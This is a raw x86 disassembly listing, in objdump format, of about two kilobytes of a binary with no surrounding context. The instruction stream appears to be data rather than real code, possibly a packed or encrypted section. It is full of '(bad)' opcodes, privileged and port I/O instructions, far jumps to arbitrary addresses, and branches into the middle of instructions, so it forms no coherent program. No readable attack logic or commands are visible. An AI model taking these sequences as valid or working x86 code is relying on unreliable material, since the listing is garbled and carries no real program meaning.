  411174:	ins    DWORD PTR es:[edi],dx
  411175:	stos   DWORD PTR es:[edi],eax
  411176:	and    ebp,DWORD PTR [esi]
  411178:	and    al,0x70
  41117a:	mov    ecx,esp
  41117c:	enter  0xfd1f,0x56
  411180:	mov    ah,0x11
  411182:	inc    edi
  411183:	pop    es
  411184:	adc    eax,0x2128ed17
  411189:	cmp    al,0xda
  41118b:	dec    esi
  41118c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41118d:	mov    esi,0x221847fb
  411192:	xchg   DWORD PTR [ebx],ebx
  411194:	xchg   cx,ax
  411196:	jmp    0x41120e
  411198:	je     0x4111bc
  41119a:	cmp    eax,0x4becefec
  41119f:	in     eax,dx
  4111a0:	adc    BYTE PTR [ebx],dh
  4111a2:	cmp    DWORD PTR [ebx],esi
  4111a4:	test   eax,0xff322e88
  4111a9:	dec    esi
  4111aa:	(bad)  
  4111ac:	ret    0xdb7b
  4111af:	out    dx,eax
  4111b0:	imul   ecx,DWORD PTR [esi],0x44
  4111b3:	aas    
  4111b4:	cld    
  4111b5:	repz je 0x41114b
  4111b8:	adc    dl,BYTE PTR [esi-0x46]
  4111bb:	aam    0xd8
  4111bd:	std    
  4111be:	and    al,0xa6
  4111c0:	xor    edx,0xffffffe4
  4111c3:	call   0x8eca:0xacada3d7
  4111ca:	jae    0x4111e6
  4111cc:	pop    edi
  4111cd:	ja     0x4111d5
  4111cf:	push   es
  4111d0:	push   ebx
  4111d1:	and    eax,DWORD PTR ds:0x323bef31
  4111d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111d8:	scas   eax,DWORD PTR es:[edi]
  4111d9:	popa   
  4111da:	leave  
  4111db:	fild   WORD PTR [ebp-0x11]
  4111de:	ret    
  4111df:	out    0x83,eax
  4111e1:	scas   al,BYTE PTR es:[edi]
  4111e2:	mov    bh,0xf4
  4111e4:	pop    eax
  4111e5:	cmp    al,BYTE PTR [ecx+0x71]
  4111e8:	ret    0x2c5e
  4111eb:	or     eax,0xecd8dfed
  4111f0:	add    eax,0x225d491e
  4111f5:	jns    0x411209
  4111f7:	js     0x411200
  4111f9:	push   eax
  4111fa:	ds (bad) 
  4111fd:	jmp    0x41119a
  4111ff:	outs   dx,DWORD PTR ds:[esi]
  411200:	(bad)  
  411201:	loop   0x41121a
  411203:	in     al,dx
  411204:	addr16 test eax,0xa0420acf
  41120a:	int3   
  41120b:	stos   DWORD PTR es:[edi],eax
  41120c:	in     al,dx
  41120d:	imul   eax,DWORD PTR [eax],0x62
  411210:	inc    ecx
  411211:	out    dx,al
  411212:	mov    edx,0x27ebd4d6
  411217:	sub    eax,0x35a21346
  41121c:	mov    bh,bh
  41121e:	iret   
  41121f:	mov    dl,ah
  411221:	call   0xca551ed8
  411226:	mov    edx,0x73265b97
  41122b:	lods   eax,DWORD PTR ds:[esi]
  41122c:	mov    BYTE PTR [eax+ecx*2],al
  41122f:	pop    edi
  411230:	and    DWORD PTR [edi],esp
  411232:	push   eax
  411233:	pop    edx
  411234:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411235:	imul   ebx,DWORD PTR [edx],0x45
  411238:	ss inc esi
  41123a:	xchg   ebp,eax
  41123b:	add    al,0x87
  41123d:	mov    DWORD PTR [eax],esp
  41123f:	aas    
  411240:	pop    ss
  411241:	inc    esi
  411242:	hlt    
  411243:	xchg   ebp,eax
  411244:	jg     0x4111cc
  411246:	(bad)  
  411247:	add    al,0xfd
  411249:	cmp    BYTE PTR [ebp+0x47145d1d],bh
  41124f:	mov    dl,0x7d
  411251:	std    
  411252:	aad    0xa7
  411254:	and    eax,0x42bc5d2
  411259:	ret    
  41125a:	in     al,0x28
  41125c:	icebp  
  41125d:	fld    TBYTE PTR [ebx+0x43168b9]
  411263:	or     BYTE PTR [eax],dh
  411265:	fisttp QWORD PTR [esi-0x72]
  411268:	aas    
  411269:	out    dx,al
  41126a:	push   eax
  41126b:	cmp    ebp,DWORD PTR ds:0x7bd73389
  411271:	jle    0x411251
  411273:	xor    edx,DWORD PTR [eax+0x31c84c7d]
  411279:	mov    al,0x64
  41127b:	lods   eax,DWORD PTR ds:[esi]
  41127c:	sub    al,0xcd
  41127e:	jns    0x41122b
  411280:	adc    cl,al
  411282:	nop
  411283:	push   esp
  411284:	std    
  411285:	test   ebp,esi
  411287:	pop    eax
  411288:	imul   ebp,DWORD PTR [esi+0x3e35be65],0xc760abdd
  411292:	cld    
  411293:	out    0x7c,eax
  411295:	mov    eax,ds:0x6bdfc9f6
  41129a:	(bad)  
  41129c:	int3   
  41129d:	arpl   WORD PTR [ecx+0x4],di
  4112a0:	hlt    
  4112a1:	(bad)  
  4112a3:	mov    ecx,0x4b0a49f8
  4112a8:	out    dx,eax
  4112a9:	cmp    eax,0x6f7a6752
  4112ae:	adc    al,0xfa
  4112b0:	retf   0x6263
  4112b3:	mov    ah,0x65
  4112b5:	jns    0x41129b
  4112b7:	mov    ah,0x7c
  4112b9:	dec    ecx
  4112ba:	aad    0x81
  4112bc:	and    BYTE PTR [edx+0x712d0aaa],0xa
  4112c3:	xchg   esp,esi
  4112c5:	out    dx,eax
  4112c6:	dec    BYTE PTR [edi-0x79]
  4112c9:	fwait
  4112ca:	dec    esi
  4112cb:	retf   0xf52b
  4112ce:	fst    QWORD PTR [edx-0x1f43f05a]
  4112d4:	adc    dh,dl
  4112d6:	xchg   ebx,eax
  4112d7:	pop    ecx
  4112d8:	mov    ch,BYTE PTR [ecx-0x5538f0d4]
  4112de:	xor    ah,BYTE PTR [ebp+ecx*8-0x36]
  4112e2:	inc    eax
  4112e3:	push   ss
  4112e4:	and    al,0xf6
  4112e6:	loope  0x4112b0
  4112e8:	cmp    ah,BYTE PTR [ebp+edx*4+0x5f]
  4112ec:	mov    edi,0x2648be1
  4112f1:	push   edx
  4112f2:	mov    bl,0x6e
  4112f4:	jne    0x411349
  4112f6:	xlat   BYTE PTR ds:[ebx]
  4112f7:	cmp    eax,0x803bc2a9
  4112fc:	mov    BYTE PTR [esi-0x49],al
  4112ff:	adc    al,0x5d
  411301:	push   esi
  411302:	and    eax,0x3b6dd73a
  411307:	pushf  
  411308:	fcomp  QWORD PTR [eax-0x16f51666]
  41130e:	jo     0x4112f5
  411310:	xor    al,0x91
  411312:	fcomp  QWORD PTR [esi]
  411314:	or     bl,BYTE PTR [ebp-0x52ae0b6]
  41131a:	fsubr  QWORD PTR [edx]
  41131c:	fmul   DWORD PTR ds:0x6d233b16
  411322:	push   ss
  411323:	pushf  
  411324:	xchg   edx,eax
  411325:	cmp    al,0xe0
  411327:	inc    esp
  411328:	jl     0x41136d
  41132a:	cmc    
  41132b:	mov    cl,0x66
  41132d:	jle    0x4112e2
  41132f:	xor    BYTE PTR [edx-0x73],cl
  411332:	dec    edi
  411333:	inc    esi
  411334:	test   DWORD PTR [edi],edx
  411336:	xchg   ebx,eax
  411337:	xor    DWORD PTR [edi],edx
  411339:	js     0x41135b
  41133b:	hlt    
  41133c:	jle    0x41134d
  41133e:	loopne 0x4112d1
  411340:	rcl    BYTE PTR [eax-0x23],cl
  411343:	jno    0x4112c9
  411345:	out    0x8,al
  411347:	adc    cl,BYTE PTR [ecx-0x2504a927]
  41134d:	gs scas al,BYTE PTR es:[edi]
  41134f:	pop    ecx
  411350:	cmp    esp,eax
  411352:	hlt    
  411353:	and    ah,ch
  411355:	cmp    al,0xca
  411357:	(bad)  
  411358:	pop    eax
  411359:	fcomp  QWORD PTR [eax+0x29540b85]
  41135f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411360:	sbb    bl,cl
  411362:	add    eax,esp
  411364:	(bad)  
  411365:	mov    DWORD PTR [ebx+0x7d4ec009],ebx
  41136b:	sbb    ebp,DWORD PTR [eax]
  41136d:	call   0xd4cac67d
  411372:	mov    ch,0x8f
  411374:	cwde   
  411375:	xchg   esi,eax
  411376:	or     bh,BYTE PTR fs:[eax+0x15]
  41137a:	popf   
  41137b:	xchg   esi,eax
  41137c:	jno    0x4113ac
  41137e:	fadd   QWORD PTR [edi-0x4b]
  411382:	je     0x41130d
  411384:	cmp    bl,BYTE PTR [esi]
  411386:	loop   0x4113fc
  411388:	mov    edx,0xe5ce81b3
  41138d:	out    dx,eax
  41138e:	aam    0xa3
  411390:	outs   dx,BYTE PTR ds:[esi]
  411391:	sbb    al,0xd
  411393:	sub    al,0x36
  411395:	sbb    bl,BYTE PTR [esi]
  411397:	xor    ebp,DWORD PTR [ebp+0x4236d047]
  41139d:	pop    ss
  41139e:	xchg   DWORD PTR [edi+0xd],esp
  4113a1:	sbb    dh,BYTE PTR [ebp-0x73]
  4113a4:	pop    es
  4113a5:	xchg   edi,eax
  4113a6:	rol    BYTE PTR [ebx-0x3f9b17ad],0x61
  4113ad:	fcomp  DWORD PTR [eax]
  4113af:	(bad)  
  4113b0:	and    DWORD PTR [ecx],edi
  4113b2:	push   0x7f721a9a
  4113b7:	mov    ah,0xe8
  4113b9:	cmc    
  4113ba:	inc    esi
  4113bb:	jecxz  0x411417
  4113bd:	pop    ds
  4113be:	sti    
  4113bf:	ja     0x4113d7
  4113c1:	ins    BYTE PTR es:[edi],dx
  4113c2:	jns    0x4113c8
  4113c4:	fcom   QWORD PTR [ecx+0x60]
  4113c7:	mov    WORD PTR [edx-0x19],cs
  4113ca:	add    ebp,DWORD PTR [esi-0xacf89fc]
  4113d0:	add    DWORD PTR [ebx],ebp
  4113d2:	mov    bl,BYTE PTR [esi]
  4113d4:	pop    es
  4113d5:	pop    esi
  4113d6:	fsubr  st,st(2)
  4113d8:	xor    BYTE PTR [edx],bl
  4113da:	pusha  
  4113db:	fld    TBYTE PTR [esi+edi*8-0x683133d0]
  4113e2:	fdivrp st(6),st
  4113e4:	sub    ah,BYTE PTR [ebp+0x6c01a594]
  4113ea:	mov    dh,0x77
  4113ec:	jae    0x411405
  4113ee:	test   eax,0x13c93d8
  4113f3:	mov    eax,0xa16db81d
  4113f8:	out    dx,ax
  4113fa:	push   ecx
  4113fb:	lock sub eax,0x1b74ed54
  411401:	push   esi
  411402:	ret    
  411403:	pushf  
  411404:	retf   0xc18f
  411407:	stc    
  411408:	pusha  
  411409:	sub    BYTE PTR [edi],cl
  41140b:	pop    edi
  41140c:	adc    BYTE PTR [edi+0x7328f7ee],dl
  411412:	(bad)  
  411414:	mov    ebx,DWORD PTR [ebp+0x70]
  411417:	or     eax,0xa1d6487f
  41141c:	push   0xaf0fb4eb
  411421:	loope  0x4113e5
  411423:	pop    ebx
  411424:	icebp  
  411425:	pusha  
  411426:	xor    ch,al
  411428:	jae    0x41149d
  41142a:	sub    cl,cl
  41142c:	popf   
  41142d:	lds    esi,FWORD PTR [ecx+0x3bcb1ad1]
  411433:	push   0xec9e84bb
  411438:	dec    edx
  411439:	xor    BYTE PTR [esi-0x3f],ch
  41143c:	cwde   
  41143d:	addr16 fs dec edx
  411440:	dec    esi
  411441:	lea    esp,[esi+0x132ca595]
  411447:	sbb    al,bl
  411449:	pop    es
  41144a:	test   al,0x23
  41144c:	js     0x4113e8
  41144e:	dec    ebx
  41144f:	out    dx,al
  411450:	add    DWORD PTR [ebx+0x4f09cb95],edx
  411456:	xchg   ecx,eax
  411457:	dec    edi
  411458:	call   FWORD PTR [edx-0x61dbcd8b]
  41145e:	iret   
  41145f:	enter  0x9352,0x1
  411463:	sub    ebp,DWORD PTR [eax]
  411465:	push   ss
  411466:	cmp    BYTE PTR [eax+eiz*1-0x13],ah
  41146a:	int    0x8d
  41146c:	adc    dh,dh
  41146e:	in     eax,0x80
  411470:	add    DWORD PTR [eax+eiz*8-0x6c6ed8cb],ecx
  411477:	dec    esp
  411478:	sub    ebp,ebp
  41147a:	lods   eax,DWORD PTR ds:[esi]
  41147b:	jmp    0x99a9:0xd8b0518a
  411482:	shl    BYTE PTR [esi+0x68e2de36],cl
  411488:	mov    bh,0xa1
  41148a:	int3   
  41148b:	stc    
  41148c:	icebp  
  41148d:	clc    
  41148e:	xor    ch,BYTE PTR [ecx]
  411490:	xor    ecx,ebp
  411492:	push   edx
  411493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411494:	pop    ds
  411495:	mov    cl,0x33
  411497:	sbb    eax,0xae29949
  41149c:	daa    
  41149d:	jge    0x41150f
  41149f:	pusha  
  4114a0:	pop    edx
  4114a1:	mov    ecx,0xda3602e8
  4114a6:	loopne 0x4114ae
  4114a8:	pop    esi
  4114a9:	sub    ch,dl
  4114ab:	(bad)  
  4114ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114ad:	enter  0xed07,0xda
  4114b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114b2:	mov    DWORD PTR [ebp-0x269cfc07],esp
  4114b8:	add    DWORD PTR [ebx+ebx*4],edi
  4114bb:	inc    esp
  4114bc:	inc    edx
  4114bd:	and    DWORD PTR [ecx],ecx
  4114bf:	adc    edi,DWORD PTR [ecx]
  4114c1:	mov    di,0x3ffc
  4114c5:	test   eax,0x7aec7904
  4114ca:	pop    edx
  4114cb:	gs out dx,eax
  4114cd:	fmul   st(6),st
  4114cf:	nop
  4114d0:	scas   eax,DWORD PTR es:[edi]
  4114d1:	dec    ebx
  4114d2:	or     bl,dl
  4114d4:	ins    DWORD PTR es:[edi],dx
  4114d5:	or     BYTE PTR [eax-0x7be286a8],ch
  4114db:	jae    0x41149c
  4114dd:	sahf   
  4114de:	push   dx
  4114e0:	inc    eax
  4114e1:	and    ecx,esp
  4114e3:	mov    esp,0x596027a1
  4114e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114e9:	mov    eax,ds:0x2f2de5a1
  4114ee:	pop    ecx
  4114ef:	cmp    BYTE PTR [ebx],bh
  4114f1:	int    0xd7
  4114f3:	adc    ah,bl
  4114f5:	xor    al,0x7b
  4114f7:	cwde   
  4114f8:	(bad)  
  4114f9:	rcr    DWORD PTR [eax-0x78],1
  4114fc:	in     eax,dx
  4114fd:	(bad)  
  4114ff:	(bad)  
  411500:	add    edx,edx
  411502:	sbb    al,BYTE PTR [ebp+0x33]
  411505:	arpl   sp,dx
  411507:	fsub   QWORD PTR [ebx]
  411509:	hlt    
  41150a:	sub    DWORD PTR [esp+edx*4-0x5],ebx
  41150e:	xor    esi,DWORD PTR [esi]
  411510:	stos   DWORD PTR es:[edi],eax
  411511:	push   edi
  411512:	fwait
  411513:	dec    eax
  411514:	in     eax,0x6a
  411516:	xor    eax,0xa704131c
  41151b:	or     eax,0xe76dba9a
  411520:	and    al,0xfb
  411522:	xchg   DWORD PTR [edx-0x76d08dd9],ecx
  411528:	add    eax,0x4b7ebeef
  41152d:	dec    edx
  41152e:	inc    ecx
  41152f:	dec    edi
  411530:	mov    cl,0x1e
  411532:	call   0xfd17:0x97bd98c
  411539:	rcr    BYTE PTR [esi+ecx*1+0x16],0x92
  41153e:	lods   eax,DWORD PTR ds:[esi]
  41153f:	jb     0x4115be
  411541:	xchg   edi,eax
  411542:	cdq    
  411543:	xchg   esp,eax
  411544:	pop    eax
  411545:	shl    BYTE PTR [ebx],0x8f
  411548:	or     eax,DWORD PTR [ecx+0x7c]
  41154b:	popa   
  41154c:	xchg   ebx,edi
  41154e:	inc    esp
  41154f:	cmc    
  411550:	aaa    
  411551:	std    
  411552:	out    0x39,eax
  411554:	pop    esp
  411555:	jge    0x41155c
  411557:	mov    ?,WORD PTR [edx]
  411559:	jmp    0xe401:0x89bb06d6
  411560:	imul   ebx,DWORD PTR [ebx+0x4b191c93],0xfffffffa
  411567:	es std 
  411569:	inc    esp
  41156a:	cmp    dl,BYTE PTR ds:0xb2ee9b84
  411570:	call   0x2bae1be6
  411575:	xlat   BYTE PTR ds:[ebx]
  411576:	mov    eax,0x69c5db77
  41157b:	in     eax,dx
  41157c:	sbb    BYTE PTR [eax+eax*1],al
  41157f:	out    dx,al
  411580:	and    DWORD PTR [eax-0x34eb8ea3],ebx
  411586:	sub    bl,dl
  411588:	cli    
  411589:	adc    ebp,DWORD PTR [esi-0x5a]
  41158c:	or     eax,0xce512e7
  411591:	jmp    0x411533
  411593:	int    0x5c
  411595:	mov    ds:0xaa9a0876,eax
  41159a:	and    eax,0x5a2e5745
  41159f:	jb     0x41153d
  4115a1:	sub    esp,DWORD PTR [edi*8-0x48d402d4]
  4115a8:	fwait
  4115a9:	inc    edi
  4115aa:	dec    eax
  4115ab:	sub    ebx,DWORD PTR [ecx-0x75671323]
  4115b1:	popf   
  4115b2:	shr    BYTE PTR [ecx],cl
  4115b4:	repz into 
  4115b6:	js     0x411555
  4115b8:	mov    edx,0xeb9af0cc
  4115bd:	lods   eax,DWORD PTR ds:[esi]
  4115be:	icebp  
  4115bf:	mov    ch,0x92
  4115c1:	popf   
  4115c2:	push   0xffffffb5
  4115c4:	mov    ecx,0xe1cd4e1e
  4115c9:	nop
  4115ca:	fcomp  QWORD PTR [eax]
  4115cc:	adc    edx,ecx
  4115ce:	lea    esi,[ebx-0x61]
  4115d1:	mov    al,al
  4115d3:	or     esp,DWORD PTR [eax+0x77]
  4115d6:	mov    ah,0x2c
  4115d8:	mov    ebp,0x1079b411
  4115dd:	dec    ecx
  4115de:	lds    eax,FWORD PTR [edi+0x5fb09ee8]
  4115e4:	out    dx,al
  4115e5:	rcl    DWORD PTR [eax+0x5e],0x6d
  4115e9:	pop    edi
  4115ea:	cmp    edi,ebp
  4115ec:	dec    esp
  4115ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115ee:	mov    al,0xa5
  4115f0:	pop    es
  4115f1:	test   BYTE PTR [eax+eiz*4+0x2ffbb072],dl
  4115f8:	jg     0x41158e
  4115fa:	or     DWORD PTR [ecx-0x6171c046],ecx
  411600:	jmp    0xb543:0xb31a8c9b
  411607:	out    dx,al
  411608:	mov    al,ds:0x4e67237e
  41160d:	cs (bad) 
  411610:	fsub   st,st(6)
  411612:	jmp    0x156a331e
  411617:	add    al,0x3e
  411619:	cmp    al,0xf3
  41161b:	test   edi,0xbb19041a
  411621:	xor    cl,BYTE PTR [ebp-0x168a115c]
  411627:	push   es
  411628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411629:	ret    0xda2f
  41162c:	dec    ebp
  41162d:	jnp    0x411671
  41162f:	lea    ebp,[edi-0x33]
  411632:	sbb    al,dh
  411634:	pop    ds
  411635:	xchg   esi,eax
  411636:	lock sub eax,0x223dcedf
  41163c:	xchg   BYTE PTR [edx+eax*8+0x77],cl
  411640:	sub    eax,0x3fd2a5e0
  411645:	lds    ebx,FWORD PTR [edi+eiz*8-0x1e]
  411649:	repnz lds edi,FWORD PTR ds:[esi+eax*8+0x3b]
  41164f:	mov    ah,0x8c
  411651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411652:	ret    
  411653:	or     ebp,esi
  411655:	inc    esp
  411656:	(bad)  
  411657:	cwde   
  411658:	pop    ss
  411659:	jg     0x4115fd
  41165b:	inc    edi
  41165c:	lahf   
  41165d:	ds dec ebx
  41165f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411660:	pop    ds
  411661:	(bad)  
  411662:	cmp    dl,BYTE PTR [ebp-0x17]
  411665:	fisub  DWORD PTR ss:[ecx-0x40b76da4]
  41166c:	aas    
  41166d:	daa    
  41166e:	push   0xfac1868d
  411673:	dec    ebx
  411674:	mov    esp,0xd993ba08
  411679:	inc    esp
  41167a:	pop    ss
  41167b:	(bad)  [edi+0x4dd0d693]
  411681:	inc    edx
  411682:	xchg   esp,eax
  411683:	push   esi
  411684:	lahf   
  411685:	ja     0x411693
  411687:	scas   eax,DWORD PTR es:[edi]
  411688:	mov    DWORD PTR [edx-0x7540b939],esi
  41168e:	dec    esp
  41168f:	in     eax,0x90
  411691:	fwait
  411692:	jb     0x41167e
  411694:	hlt    
  411695:	xchg   ebp,eax
  411696:	inc    esi
  411697:	mov    ds:0xe5f30f63,eax
  41169c:	dec    ebx
  41169d:	dec    eax
  41169e:	adc    eax,0xcb01517e
  4116a3:	lock push ebx
  4116a5:	jmp    0x9994:0xc7e69e08
  4116ac:	mov    dl,0x97
  4116ae:	clts   
  4116b0:	sbb    dl,BYTE PTR [esi+0x4f]
  4116b3:	addr16 cmp eax,0xb614cebb
  4116b9:	adc    al,0x92
  4116bb:	mov    ch,0x1f
  4116bd:	(bad)  [edi]
  4116bf:	cli    
  4116c0:	or     ebx,edx
  4116c2:	lods   eax,DWORD PTR ds:[esi]
  4116c3:	test   al,0xeb
  4116c5:	popa   
  4116c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116c7:	pop    esp
  4116c8:	(bad)  
  4116c9:	or     edi,DWORD PTR [ecx]
  4116cb:	sub    al,0x64
  4116cd:	aam    0x43
  4116cf:	mov    ch,BYTE PTR [ecx+0x5e]
  4116d2:	into   
  4116d3:	xor    DWORD PTR [edi],ecx
  4116d5:	loop   0x411750
  4116d7:	sub    BYTE PTR [eax-0x40],0xac
  4116db:	mov    bh,0x5d
  4116dd:	adc    eax,0xb4de7ddd
  4116e2:	cld    
  4116e3:	sete   BYTE PTR [edx]
  4116e6:	adc    esp,ebp
  4116e8:	mov    dl,0x94
  4116ea:	loop   0x4116a9
  4116ec:	dec    eax
  4116ed:	inc    esi
  4116ee:	xor    edi,edx
  4116f0:	inc    ecx
  4116f1:	test   BYTE PTR [edi],bl
  4116f3:	jmp    0xe39c1e64
  4116f8:	jns    0x4116e9
  4116fa:	out    0xde,al
  4116fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116fd:	pop    ecx
  4116fe:	(bad)  
  4116ff:	cld    
  411700:	data16 jge 0x41174d
  411703:	out    0xe1,eax
  411705:	bts    DWORD PTR [edx],ecx
  411708:	and    esp,DWORD PTR [edi+edi*1-0xa7f057e]
  41170f:	mov    eax,ds:0x4f2f5c3
  411714:	jnp    0x4116ae
  411716:	xchg   edx,eax
  411717:	inc    BYTE PTR [esi-0x7e]
  41171a:	mov    eax,ds:0xd799a8b7
  41171f:	push   ebx
  411720:	cmp    eax,0xc82b5df4
  411725:	in     eax,dx
  411726:	mov    eax,ds:0xa167f58c
  41172b:	jle    0x411778
  41172d:	adc    BYTE PTR [ebp-0x10],0x78
  411731:	cs pushf 
  411733:	inc    esi
  411734:	pop    eax
  411735:	ret    0x4575
  411738:	cmp    BYTE PTR [ebx-0x35],bl
  41173b:	jmp    DWORD PTR [ebp+0x69d9f86e]
  411741:	pop    ecx
  411742:	push   ss
  411743:	push   ebx
  411744:	mov    edi,0xedf193cd
  411749:	push   0x653c529
  41174e:	stc    
  41174f:	mov    bh,0x60
  411751:	pop    esi
  411752:	or     eax,0x685fbdda
  411757:	das    
  411758:	mov    ds:0xcc12530e,eax
  41175d:	and    bl,BYTE PTR [ecx]
  41175f:	push   cs
  411760:	sti    
  411761:	inc    esi
  411762:	push   ss
  411763:	out    dx,al
  411764:	sub    BYTE PTR [edx+0x70bfe92e],cl
  41176a:	pop    ebx
  41176b:	pop    es
  41176c:	dec    ebx
  41176d:	xchg   esp,eax
  41176e:	sub    al,0x4d
  411770:	push   ebx
  411771:	push   ds
  411772:	gs ret 0x19c0
  411776:	push   ss
  411777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411778:	in     eax,dx
  411779:	gs push ss
  41177b:	jmp    0xacc6c0bc
  411780:	jl     0x411713
  411782:	jmp    0xd5c648fe
  411787:	not    DWORD PTR [edi]
  411789:	ss ret 0xebfc
  41178d:	xchg   esp,eax
  41178e:	add    BYTE PTR [ebp-0x2a],ah
  411791:	retf   
  411792:	xor    eax,0xca7ed574
  411797:	mov    ah,0x93
  411799:	outs   dx,DWORD PTR ds:[esi]
  41179a:	(bad)  
  41179b:	mov    ebx,0xb2376ca2
  4117a0:	jle    0x4117a2
  4117a2:	xor    DWORD PTR [esi-0x21],0xffffffe1
  4117a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117a7:	loopne 0x4117cd
  4117a9:	sbb    DWORD PTR [esi+0x49],ecx
  4117ac:	outs   dx,DWORD PTR ds:[esi]
  4117ad:	(bad)  
  4117ae:	test   BYTE PTR [esi-0x58],0x7a
  4117b2:	pop    ss
  4117b3:	in     eax,0x74
  4117b5:	inc    esp
  4117b6:	pop    eax
  4117b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117b8:	cmp    BYTE PTR [ebx-0x6],ch
  4117bb:	cmc    
  4117bc:	jge    0x4117c7
  4117be:	rol    BYTE PTR ss:0xdc6db6b,0x37
  4117c6:	retf   
  4117c7:	lods   al,BYTE PTR ds:[esi]
  4117c8:	push   0xdc7b3e8a
  4117cd:	mov    bh,0x36
  4117cf:	sbb    ecx,eax
  4117d1:	mov    ds:0x53966658,al
  4117d6:	int3   
  4117d7:	repnz push edi
  4117d9:	sub    BYTE PTR [esi+0x6b],dh
  4117dc:	shr    BYTE PTR [ebx+0x5fe00319],cl
  4117e2:	int    0x2e
  4117e4:	xchg   sp,ax
  4117e6:	int3   
  4117e7:	es adc eax,0x51fa851e
  4117ed:	shl    BYTE PTR [eax],0x7c
  4117f0:	call   0x4c48af97
  4117f5:	fsub   st(1),st
  4117f7:	jge    0x411846
  4117f9:	into   
  4117fa:	jb     0x41183b
  4117fc:	imul   ebx,ebx,0xd2eab298
  411802:	nop
  411803:	arpl   WORD PTR [esi],di
  411805:	xlat   BYTE PTR ds:[ebx]
  411806:	jmp    0x41179a
  411808:	int3   
  411809:	out    dx,eax
  41180a:	(bad)  
  41180b:	outs   dx,BYTE PTR ds:[esi]
  41180c:	in     al,dx
  41180d:	popf   
  41180e:	sahf   
  41180f:	pop    eax
  411810:	push   ds
  411811:	inc    eax
  411812:	mov    bh,0x6
  411814:	cmp    DWORD PTR [ebx+0x5],esi
  411817:	fcomp  st(6)
  411819:	push   eax
  41181a:	jae    0x4117e3
  41181c:	popf   
  41181d:	mov    bl,0x4e
  41181f:	js     0x41185b
  411821:	sbb    BYTE PTR [esi-0x1fa25b59],al
  411827:	xchg   esi,eax
  411828:	jb     0x41186a
  41182a:	pop    esi
  41182c:	rcl    bl,cl
  41182e:	sbb    eax,0x9dcfa7c4
  411833:	arpl   WORD PTR [ebx-0x22],ax
  411836:	jp     0x4117e2
  411838:	lods   eax,DWORD PTR ds:[esi]
  411839:	mov    ah,0xa
  41183b:	ins    BYTE PTR es:[edi],dx
  41183c:	retf   
  41183d:	sbb    eax,0x4c5b18fb
  411842:	out    dx,al
  411843:	sub    eax,DWORD PTR [eax+0x6a33fa8c]
  411849:	aas    
  41184a:	gs repz faddp st(7),st
  41184e:	xor    eax,0x647ea32d
  411853:	lock pop es
  411855:	(bad)  [eax+0x3971630c]
  41185b:	dec    cl
  41185d:	ja     0x411895
  41185f:	jp     0x411834
  411861:	push   esi
  411862:	and    dh,bl
  411864:	dec    ebp
  411865:	jle    0x4118b5
  411867:	(bad)  
  411868:	pusha  
  411869:	les    esi,FWORD PTR [esi+0x47]
  41186c:	jno    0x4118a2
  41186e:	cli    
  41186f:	xor    dl,BYTE PTR [esi+ebp*4-0x12]
  411873:	add    DWORD PTR [edx],edx
  411875:	push   0xe8498942
  41187a:	xor    cl,BYTE PTR [edx-0x78f52437]
  411880:	inc    esi
  411881:	mov    ds:0x6a47c7a8,eax
  411886:	fmul   QWORD PTR [eax-0xe]
  411889:	lods   al,BYTE PTR ds:[esi]
  41188a:	loopne 0x4118d0
  41188c:	outs   dx,DWORD PTR ds:[esi]
  41188d:	js     0x4118f2
  41188f:	inc    edi
  411890:	arpl   ax,cx
  411892:	fistp  QWORD PTR fs:[ebp+0x42127162]
  411899:	aaa    
  41189a:	fidiv  WORD PTR [edi-0x49f795cd]
  4118a0:	add    bh,dh
  4118a2:	cdq    
  4118a3:	scas   al,BYTE PTR es:[edi]
  4118a4:	mov    al,ds:0xd4275c3a
  4118a9:	jb     0x411878
  4118ab:	cli    
  4118ac:	(bad)  
  4118ad:	js     0x41183e
  4118af:	sub    ah,BYTE PTR [eax]
  4118b1:	mov    bl,ch
  4118b3:	scas   eax,DWORD PTR es:[edi]
  4118b4:	or     eax,0xa06190d5
  4118b9:	call   0xb376:0x82898b6f
  4118c0:	test   al,0x2d
  4118c2:	btr    DWORD PTR [ecx],0x30
  4118c6:	and    al,0x29
  4118c8:	push   esi
  4118c9:	adc    esi,ecx
  4118cb:	jnp    0x411895
  4118cd:	mov    dh,bh
  4118cf:	hlt    
  4118d0:	retf   0x9c93
  4118d3:	cwde   
  4118d4:	mov    gs,WORD PTR [ecx+0x53]
  4118d7:	imul   eax,DWORD PTR [eax-0x3e635ed4],0xffffff91
  4118de:	fmul   st(6),st
  4118e0:	pushf  
  4118e1:	aam    0xab
  4118e3:	add    eax,0xc03cd72d
  4118e8:	pop    ebp
  4118e9:	sub    BYTE PTR [ecx+0x40],0x3f
  4118ed:	and    al,0x9a
  4118ef:	inc    ecx
  4118f0:	clc    
  4118f1:	cwde   
  4118f2:	pop    edi
  4118f3:	cwde   
  4118f4:	xor    ch,dh
  4118f6:	jge    0x411901
  4118f8:	(bad)  
  4118f9:	jmp    0x76f3:0x3502623a
  411900:	cwde   
  411901:	cmp    bl,BYTE PTR [edi+0x2e]
  411904:	fnstenv [edx-0xd8601d4]
  41190a:	sub    DWORD PTR [edi+0x42],ecx
  41190d:	jo     0x411918
  41190f:	dec    eax
  411910:	push   ds
  411911:	fsub   QWORD PTR [ebx-0x344107d9]
  411917:	mov    dl,0x51
  411919:	ins    BYTE PTR es:[edi],dx
  41191a:	cmp    dh,ch
  41191c:	mov    cl,0xd
  41191e:	mov    BYTE PTR gs:[edi+0x606e9083],dh
  411925:	jp     0x411915
  411927:	adc    dl,al
